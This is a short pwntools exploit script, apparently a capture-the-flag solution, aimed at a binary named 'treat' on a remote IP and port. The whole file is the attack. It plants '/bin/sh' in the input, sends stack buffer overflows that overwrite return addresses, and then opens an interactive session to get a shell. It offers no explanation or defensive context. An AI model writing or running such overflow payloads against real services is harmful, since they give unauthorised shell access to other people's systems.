from pwn import *

binary = './treat'
context.arch = 'amd64'

# p = process(binary)
p = remote('130.211.214.112', 18010)
# gdb.attach(p, 'b *0x0040162c')
p = gdb.debug(binary, 'b *0x0040162c')

p.sendline("TREAT=/bin/sh")

p.sendline('A'*0x138 + '\x80\x50\x40')
p.sendline('A' * 72 + p64(0x00401186))
p.interactive()
